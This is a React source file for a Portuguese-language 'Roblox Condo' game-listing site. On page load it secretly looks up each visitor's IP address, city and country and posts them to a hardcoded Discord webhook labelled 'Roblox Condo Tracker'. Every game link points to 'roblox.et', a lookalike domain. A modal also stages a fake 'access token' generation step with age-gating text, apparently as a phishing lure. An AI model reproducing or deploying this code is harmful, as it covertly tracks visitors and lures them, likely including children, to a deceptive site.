import { useEffect, useState } from "react";

const DISCORD_WEBHOOK =
  "https://discord.com/api/webhooks/1454577221573410889/pNI1MaYQTFm3n0-1UBkOLKUMF216j5XHEssVnioYKLnzMy8dkXpFJaa67fs4-x6iABEj";

const GAME_LINK =
  "https://www.roblox.et/games/78896868574590/Untitled-Cons-Experiences?privateServerLinkCode=41994734976691874690322389230807";

function getFlagEmoji(countryCode: string): string {
  if (!countryCode || countryCode.length !== 2) return "🌍";
  const codePoints = [...countryCode.toUpperCase()].map(
    (c) => 0x1f1e6 - 65 + c.charCodeAt(0)
  );
  return String.fromCodePoint(...codePoints);
}

async function notifyVisitor() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    const country = data.country_name || "Desconhecido";
    const countryCode = data.country_code || "";
    const flag = getFlagEmoji(countryCode);
    const city = data.city || "";
    const ip = data.ip || "—";

    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [
          {
            title: "👁️ Novo visitante no Roblox Condo!",
            color: 0xff0000,
            fields: [
              { name: "🌍 País", value: `${flag} ${country}`, inline: true },
              { name: "🏙️ Cidade", value: city || "—", inline: true },
              { name: "🔗 IP", value: ip, inline: true },
            ],
            timestamp: new Date().toISOString(),
            footer: { text: "Roblox Condo Tracker" },
          },
        ],
      }),
    });
  } catch {}
}

interface Game {
  id: number;
  title: string;
  desc: string;
  category: string;
  link: string;
}

const GAMES: Game[] = [
  {
    id: 1,
    title: "Condo Experience",
    desc: "Explore uma experiência social exclusiva com jogadores do mundo inteiro. Servidor privado com acesso especial.",
    category: "Social",
    link: GAME_LINK,
  },
  {
    id: 2,
    title: "Fun Combat",
    desc: "Jump into intense battles with friends. Fast-paced action with unique mechanics and epic arenas that keep you on the edge of your seat.",
    category: "Ação",
    link: GAME_LINK,
  },
  {
    id: 3,
    title: "Condo Party",
    desc: "Venha se divertir na festa mais exclusiva do Roblox. Música, dança e muita diversão com seus amigos.",
    category: "Social",
    link: GAME_LINK,
  },
  {
    id: 4,
    title: "Condo VIP",
    desc: "Acesso VIP com servidor privado. Experiência premium para membros selecionados com recursos exclusivos.",
    category: "VIP",
    link: GAME_LINK,
  },
];

function GameCard({ game, onClick }: { game: Game; onClick: () => void }) {
  const [liked, setLiked] = useState(false);

  return (
    <div className="game-card">
      <div className="card-thumb">
        <img src="/roblox-thumb.png" alt={game.title} />
        <div className="card-thumb-overlay" />
        <button
          className={`heart-btn ${liked ? "liked" : ""}`}
          onClick={(e) => {
            e.stopPropagation();
            setLiked(!liked);
          }}
        >
          ♥
        </button>
        <span className="category-tag">{game.category}</span>
      </div>
      <div className="card-body">
        <h3 className="card-title">{game.title}</h3>
        <p className="card-desc">{game.desc}</p>
        <button className="btn-jogar" onClick={onClick}>
          Jogar Agora
        </button>
      </div>
    </div>
  );
}

function Modal({ game, onClose }: { game: Game; onClose: () => void }) {
  const [tokenGenerated, setTokenGenerated] = useState(false);
  const [generating, setGenerating] = useState(false);

  function handleGenerate() {
    setGenerating(true);
    setTimeout(() => {
      setGenerating(false);
      setTokenGenerated(true);
    }, 1500);
  }

  return (
    <div className="modal-backdrop" onClick={onClose}>
      <div className="modal" onClick={(e) => e.stopPropagation()}>
        <div className="modal-thumb">
          <img src="/roblox-thumb.png" alt={game.title} />
          <div className="modal-thumb-overlay" />
          <button className="modal-close" onClick={onClose}>✕</button>
        </div>
        <div className="modal-body">
          <h2 className="modal-title">{game.title}</h2>

          <div className="requirements-box">
            <div className="req-header">
              <span className="req-icon">⊘</span>
              <span className="req-label">Requisitos de Entrada</span>
            </div>
            <p className="req-text">
              Nosso jogo usa bots de segurança avançados para proteger contra
              denúncias e garantir uma experiência segura.{" "}
              <strong>Contas com menos de 80 dias</strong> não têm permissão
              para entrar, a fim de evitar abusos e manter nossas experiências
              online.
            </p>
            <p className="req-text" style={{ marginTop: "0.75rem" }}>
              Gere seu <strong>token de acesso pessoal</strong> abaixo para
              verificar sua sessão e entrar no jogo.
            </p>
          </div>

          <button
            className={`btn-token ${tokenGenerated ? "done" : ""}`}
            onClick={handleGenerate}
            disabled={tokenGenerated || generating}
          >
            <span className="btn-icon">🔒</span>
            {generating
              ? "Gerando..."
              : tokenGenerated
              ? "✓ Token Gerado"
              : "Gerar Token de Acesso"}
          </button>

          <a
            href={tokenGenerated ? game.link : undefined}
            target="_blank"
            rel="noopener noreferrer"
            className={`btn-acessar ${!tokenGenerated ? "disabled" : ""}`}
            onClick={(e) => !tokenGenerated && e.preventDefault()}
          >
            <span className="btn-icon">▷</span>
            Acessar Jogo
          </a>
        </div>
      </div>
    </div>
  );
}

export default function App() {
  const [selectedGame, setSelectedGame] = useState<Game | null>(null);

  useEffect(() => {
    notifyVisitor();
  }, []);

  return (
    <div className="app">
      <header className="header">
        <div className="header-logo">
          <div className="logo-badge">R</div>
          <span className="header-title">Roblox Condo</span>
        </div>
        <span className="header-sub">Experiências Exclusivas</span>
      </header>

      <main className="feed">
        {GAMES.map((game) => (
          <GameCard
            key={game.id}
            game={game}
            onClick={() => setSelectedGame(game)}
          />
        ))}
      </main>

      {selectedGame && (
        <Modal game={selectedGame} onClose={() => setSelectedGame(null)} />
      )}
    </div>
  );
}
